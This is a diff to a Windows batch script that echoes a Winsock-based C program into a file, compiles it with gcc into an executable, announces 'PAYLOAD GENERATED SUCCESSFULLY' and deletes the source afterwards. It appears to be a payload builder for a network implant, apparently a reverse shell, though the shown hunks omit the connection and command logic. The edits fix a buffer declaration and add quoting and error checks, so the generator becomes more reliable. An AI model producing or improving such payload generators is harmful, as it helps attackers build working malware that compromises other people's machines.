@@ -27,7 +27,7 @@ echo int main() {
 echo     WSADATA wsaData;
 echo     SOCKET sock;
 echo     struct sockaddr_in server;
-echo     char *buffer[1024];
+echo     char buffer[1024];   // Changed from char *buffer[1024] to char buffer[1024]
 echo.
 echo     // Initialize Winsock
 echo     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
@@ -77,22 +77,29 @@ echo     closesocket(sock);
 echo     WSACleanup();
 echo     return 0;
 echo }
-) > !OUTPUT!.c
+) > "!OUTPUT!.c"
 
-:: Compile the generated C file using GCC
-gcc -o !OUTPUT!.exe !OUTPUT!.c -lws2_32
+:: Check if the file was created
+if exist "!OUTPUT!.c" (
+    :: Compile the generated C file using GCC
+    gcc -o "!OUTPUT!.exe" "!OUTPUT!.c" -lws2_32
 
-:: Check if the compilation was successful
-if exist "!OUTPUT!.exe" (
-    echo.
-    echo PAYLOAD GENERATED SUCCESSFULLY
-    echo.
-    :: Remove the C source file after successful compilation
-    del /f /q !OUTPUT!.c
-    echo The source file !OUTPUT!.c has been deleted.
+    :: Check if the compilation was successful
+    if exist "!OUTPUT!.exe" (
+        echo.
+        echo PAYLOAD GENERATED SUCCESSFULLY
+        echo.
+        
+        :: Remove the C source file after successful compilation
+        del /f /q "!OUTPUT!.c"
+        echo The source file "!OUTPUT!.c" has been deleted.
+    ) else (
+        echo.
+        echo Error during compilation.
+    )
 ) else (
     echo.
-    echo Error during compilation.
+    echo Failed to create the C file.
 )
 
 :: Reset color to default and pause
